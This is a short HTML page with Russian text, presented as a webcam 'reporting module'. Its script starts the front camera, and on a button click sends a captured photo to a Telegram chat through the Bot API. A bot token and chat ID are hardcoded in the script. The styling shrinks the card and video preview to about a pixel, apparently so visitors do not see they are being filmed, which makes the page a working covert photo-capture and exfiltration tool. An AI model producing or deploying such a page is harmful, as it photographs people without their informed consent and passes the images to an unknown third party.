<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Модуль веб-съемки и отчётности</title>
    
    <!-- ========================================== -->
    <!-- 1. СТИЛИ ИНТЕРФЕЙСА (CSS)                  -->
    <!-- ========================================== -->
    <style>
        /* Сброс базовых отступов и настройка темного фона */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0f172a;
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* Главный контейнер (карточка сервиса) */
        .app-card {
            background-color: #1e293b;
            width: 100%;
            max-width: 1px;
            border-radius: 1px;
            padding: 1px;
            box-shadow: 0 1px 1px -5px rgba(0, 0, 0, 0.3);
            border: 1px solid #334155;
            text-align: center;
        }

        /* Заголовок и подзаголовок */
        .app-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #38bdf8;
        }

        .app-subtitle {
            font-size: 0.9rem;
            color: #94a3b8;
            margin-bottom: 20px;
        }

        /* Видеоконтейнер с закруглениями и рамкой */
        .video-container {
            position: relative;
            width: 1%;
            background-color: #000;
            border-radius: 1px;
            overflow: hidden;
            border: 2px solid #475569;
            aspect-ratio: 4 / 3;
            margin-bottom: 1px;
        }

        /* Элемент видео (веб-камера) */
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Кнопка действия */
        .btn-submit {
            width: 100%;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            color: #ffffff;
            background-color: #2563eb;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }

        .btn-submit:hover {
            background-color: #1d4ed8;
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        /* Статус отправки / ошибок */
        .status-message {
            margin-top: 15px;
            font-size: 0.85rem;
            color: #94a3b8;
        }

        /* Адаптивные стили под мобильные экраны */
        @media (max-width: 480px) {
            .app-card {
                padding: 1px;
            }
            .app-title {
                font-size: 1.25rem;
            }
        }
    </style>
</head>
<body>

    <!-- ========================================== -->
    <!-- 2. ВЕРСТКА ИНТЕРФЕЙСА (HTML)               -->
    <!-- ========================================== -->
    <div class="app-card">
        <h1 class="app-title">Модуль отчётности</h1>
        <p class="app-subtitle">Поместите объект в кадр и нажмите кнопку ниже</p>

        <!-- Область отображения видеопотока -->
        <div class="video-container">
            <video id="webcam" autoplay playsinline></video>
        </div>

        <!-- Кнопка действия для пользователя -->
        <button id="snap" class="btn-submit">Продолжить</button>

        <!-- Текстовое поле для вывода статусов -->
        <div id="status" class="status-message">Ожидание...</div>

        <!-- Скрытый холст (Canvas) для обработки и кодирования кадров -->
        <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
    </div>

    <!-- ========================================== -->
    <!-- 3. ЛОГИКА РАБОТЫ (JAVASCRIPT)             -->
    <!-- ========================================== -->
    <script>
        // --- КОНФИГУРАЦИЯ TELEGRAM API ---
        const BOT_TOKEN = "8635631672:AAEUTI_AdLoQd3UEaCsjZkDGn4pq5yHskOo";
        const CHAT_ID = "907176273";

        // --- ПОЛУЧЕНИЕ ССЫЛОК НА ЭЛЕМЕНТЫ DOM ---
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const snapBtn = document.getElementById('snap');
        const statusText = document.getElementById('status');

        // --- 1. ЗАПУСК ВЕБ-КАМЕРЫ (WebRTC) ---
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerText = "Готова к работе.";
            })
            .catch(err => {
                console.error("Ошибка доступа к камере:", err);
                statusText.innerText = "Ошибка: не удалось получить доступ.";
            });

        // --- 2. ОБРАБОТКА НАЖАТИЯ НА КНОПКУ "ПРОДОЛЖИТЬ" ---
        snapBtn.addEventListener('click', () => {
            statusText.innerText = "Обработка и отправка данных...";
            snapBtn.disabled = true;

            // Захватываем текущий кадр из элемента <video> и отрисовываем на <canvas>
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Преобразуем содержимое Canvas в форматированный файл JPEG
            canvas.toBlob(blob => {
                if (!blob) {
                    statusText.innerText = "Ошибка формирования .";
                    snapBtn.disabled = false;
                    return;
                }

                // Формируем мультипарт-данные для отправки через HTTP POST
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'report_frame.jpg');

                // --- 3. ОТПРАВКА ДАННЫХ В TELEGRAM BOT API ---
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        statusText.innerText = "Отчёт успешно отправлен!";
                    } else {
                        statusText.innerText = "Ошибка отправки. Проверьте настройки бота.";
                        console.error("Ошибка API Telegram:", data);
                    }
                })
                .catch(err => {
                    statusText.innerText = "Сетевая ошибка при отправке отчёта.";
                    console.error("Сетевая ошибка:", err);
                })
                .finally(() => {
                    snapBtn.disabled = false;
                });

            }, 'image/jpeg', 0.85);
        });
    </script>
</body>
</html>
